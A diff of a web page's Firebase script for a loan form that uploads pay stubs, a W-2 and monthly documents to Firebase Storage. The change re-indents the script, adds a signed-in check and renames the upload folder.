@@ -255,15 +255,17 @@
     <script type="text/javascript" src="js/wow.min.js"></script>
     <script src="https://unpkg.com/ionicons@5.4.0/dist/ionicons.js"></script>
     <script type="text/javascript" src="js/custom.js"></script>
-<script type="module">
-    // Import the necessary functions from the Firebase SDK
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
-    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-    // Your web app's Firebase configuration
-    const firebaseConfig = {
+    
+    <script type="module">
+        // Import the necessary functions from the Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
             apiKey: "AIzaSyAgqyJwpRfrcny-HwGWfgk_pnKpDLrvFz0",
             authDomain: "banca-info.firebaseapp.com",
             projectId: "banca-info",
@@ -271,97 +273,104 @@
             messagingSenderId: "822849353480",
             appId: "1:822849353480:web:ebebda5670f9c2dfc8debd"
         };
-
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
-    const storage = getStorage(app);
-    const auth = getAuth(app);
-
-    // Function to generate a random file name
-    function generateRandomFileName(file) {
-        const randomString = Math.random().toString(36).substring(2, 8);
-        const fileExtension = file.name.split('.').pop();
-        return `file_${randomString}.${fileExtension}`;
-    }
-
-    // Function to upload file to Firebase Storage with a renamed file
-    function uploadFile(uid, file) {
-        return new Promise((resolve, reject) => {
-            const fileName = generateRandomFileName(file);
-            const storageRefVar = storageRef(storage, `uploads/${uid}/${fileName}`);
-
-            // Use put for smaller files and uploadBytesResumable for larger files
-            const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
-
-            uploadTask.then((snapshot) => {
-                getDownloadURL(snapshot.ref).then((downloadURL) => {
-                    resolve(downloadURL);
+    
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const storage = getStorage(app);
+        const auth = getAuth(app);
+    
+        // Function to generate a random file name
+        function generateRandomFileName(file) {
+            const randomString = Math.random().toString(36).substring(2, 8);
+            const fileExtension = file.name.split('.').pop();
+            return `file_${randomString}.${fileExtension}`;
+        }
+    
+        // Function to upload file to Firebase Storage with a renamed file
+        function uploadFile(uid, file) {
+            return new Promise((resolve, reject) => {
+                const fileName = generateRandomFileName(file);
+                const storageRefVar = storageRef(storage, `document-uploads/${uid}/${fileName}`);
+    
+                // Use put for smaller files and uploadBytesResumable for larger files
+                const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+    
+                uploadTask.then((snapshot) => {
+                    getDownloadURL(snapshot.ref).then((downloadURL) => {
+                        resolve(downloadURL);
+                    });
+                }).catch((error) => {
+                    console.error('Error uploading file:', error);
+                    reject(null);
                 });
-            }).catch((error) => {
-                console.error('Error uploading file:', error);
-                reject(null);
             });
+        }
+    
+        // Submit form and store data in Firebase
+        document.getElementById('loanForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+    
+            // Get current user
+            const user = auth.currentUser;
+    
+            // Check if a user is signed in
+            if (!user) {
+                alert('Please sign in to submit the form.');
+                return;
+            }
+    
+            // Get form values
+            const payStubsFile = document.querySelector('input[name="Pay_stubs"]').files[0];
+            const w2TaxFile = document.querySelector('input[name="W-2_tax"]').files[0];
+            const january2024File = document.querySelector('input[name="January_2024"]').files[0];
+            const february2024File = document.querySelector('input[name="February_2024"]').files[0];
+            const agreeBox = document.getElementById('agreeBox').checked;
+    
+            // Check if the agreement box is checked
+            if (!agreeBox) {
+                alert('Please agree to the terms before submitting the form.');
+                return;
+            }
+    
+            // Check if all files are selected
+            if (!payStubsFile || !w2TaxFile || !january2024File || !february2024File) {
+                alert('Please select all required files.');
+                return;
+            }
+    
+            try {
+                // Upload files and get their download URLs
+                const [payStubsURL, w2TaxURL, january2024URL, february2024URL] = await Promise.all([
+                    uploadFile(user.uid, payStubsFile),
+                    uploadFile(user.uid, w2TaxFile),
+                    uploadFile(user.uid, january2024File),
+                    uploadFile(user.uid, february2024File)
+                ]);
+    
+                // Store data in Firebase
+                const formData = {
+                    payStubsURL,
+                    w2TaxURL,
+                    january2024URL,
+                    february2024URL
+                };
+    
+                // Set data at the specified location using UID as the key
+                const userRef = ref(database, `users/${user.uid}/documents`);
+                await set(userRef, formData);
+    
+                // Display submission confirmation
+                alert('Submission successful!');
+                // Redirect to approved.html after successful submission
+                window.location.href = 'approved.html';
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                alert('An error occurred while submitting the form. Please try again.');
+            }
         });
-    }
-
-    // Submit form and store data in Firebase
-    document.getElementById('loanForm').addEventListener('submit', async function (e) {
-        e.preventDefault();
-
-        // Get current user
-        const user = auth.currentUser;
-
-        // Get form values
-        const payStubsFile = document.querySelector('input[name="Pay_stubs"]').files[0];
-        const w2TaxFile = document.querySelector('input[name="W-2_tax"]').files[0];
-        const january2024File = document.querySelector('input[name="January_2024"]').files[0];
-        const february2024File = document.querySelector('input[name="February_2024"]').files[0];
-        const agreeBox = document.getElementById('agreeBox').checked;
-
-        // Check if the agreement box is checked
-        if (!agreeBox) {
-            alert('Please agree to the terms before submitting the form.');
-            return;
-        }
-
-        // Check if all files are selected
-        if (!payStubsFile || !w2TaxFile || !january2024File || !february2024File) {
-            alert('Please select all required files.');
-            return;
-        }
-
-        try {
-            // Upload files and get their download URLs
-            const [payStubsURL, w2TaxURL, january2024URL, february2024URL] = await Promise.all([
-                uploadFile(user.uid, payStubsFile),
-                uploadFile(user.uid, w2TaxFile),
-                uploadFile(user.uid, january2024File),
-                uploadFile(user.uid, february2024File)
-            ]);
-
-            // Store data in Firebase
-            const formData = {
-                payStubsURL,
-                w2TaxURL,
-                january2024URL,
-                february2024URL
-            };
-
-            // Set data at the specified location using UID as the key
-            const userRef = ref(database, `users/${user.uid}/documents`);
-            await set(userRef, formData);
-
-            // Display submission confirmation
-            alert('Submission successful!');
-            // Redirect to approved.html after successful submission
-            window.location.href = 'approved.html';
-        } catch (error) {
-            console.error('Error submitting form:', error);
-            alert('An error occurred while submitting the form. Please try again.');
-        }
-    });
-</script>
+    </script>
+    
 
     <!--Start of Tawk.to Script-->
 <script type="text/javascript">
